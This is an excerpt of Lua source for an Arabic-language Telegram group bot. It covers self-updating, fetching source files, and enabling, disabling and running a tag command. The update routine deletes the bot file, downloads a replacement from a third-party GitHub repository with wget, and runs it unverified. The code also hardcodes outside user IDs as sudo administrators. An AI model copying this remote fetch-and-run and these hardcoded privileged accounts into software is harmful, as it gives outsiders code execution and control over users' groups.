...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/n2geh/top/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1419638907,1312558822}   
...
if tonumber(user_id) == tonumber(1419638907) then  
var = true  
...
os.execute('rm -rf BOYKA.lua')
os.execute('wget https://raw.githubusercontent.com/n2geh/top/master/BOYKA.lua')
send(msg.chat_id_, msg.id_,' ⚝ تم تحديث السورس \n ⚝ لديك اخر اصدار لسورس فاست\n ⚝ الاصدار » { 1.3v}')
dofile('BOYKA.lua')  
end
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/n2geh/top/master/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/n2geh/top/master/File_Bot/"..file)
if res == 200 then
...
if text and text:match("^تاج (.*)$") then
local username = text:match("^تاج (.*)$") 
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
function start_function(extra, result, success)
...
send(msg.chat_id_, msg.id_,' ⚝ لا استطيع اتاج معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,' ⚝ لا استطيع اتاج معرف بوتات') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'⚠| لا اسطيع تاج معرفات الجروبات') 
return false  
end
if result.id_ then
send(msg.chat_id_, msg.id_,' ⚝ تعال حبي يتاجونك بل جروب [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,' ⚝ تم تعطيل امر تاج') 
end
return false
end
...
if text == 'تفعيل تاج' and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = ' ⚝ تم تفعيل امر تاج'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = ' ⚝ بالتاكيد تم تفعيل امر تاج'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
if text == 'تعطيل تاج' and Manager(msg) then  
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
database:set(bot_id..'Seh:User'..msg.chat_id_,true)  
Text = '\n ⚝ تم تعطيل امر تاج'
else
Text = '\n ⚝ بالتاكيد تم تعطيل امر تاج'
end
send(msg.chat_id_, msg.id_,Text) 
end
